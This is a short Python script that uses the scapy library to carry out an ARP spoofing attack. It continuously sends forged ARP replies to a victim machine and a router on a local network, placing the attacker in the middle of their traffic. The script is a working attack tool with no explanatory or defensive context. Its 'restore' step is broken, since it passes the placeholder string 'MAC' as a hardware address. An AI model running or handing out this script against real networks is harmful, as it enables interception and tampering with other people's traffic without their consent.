from scapy.all import *
import time

victim_ip = "192.168.1.10"
router_ip = "192.168.1.1"
attacker_mac = get_if_hwaddr("eth0")  

def spoof(target_ip, spoof_ip):
    pkt = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(pkt, verbose=False)

try:
    print("[*]srart attacking ...")
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] إ ARP")
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwsrc="MAC"), count=3)
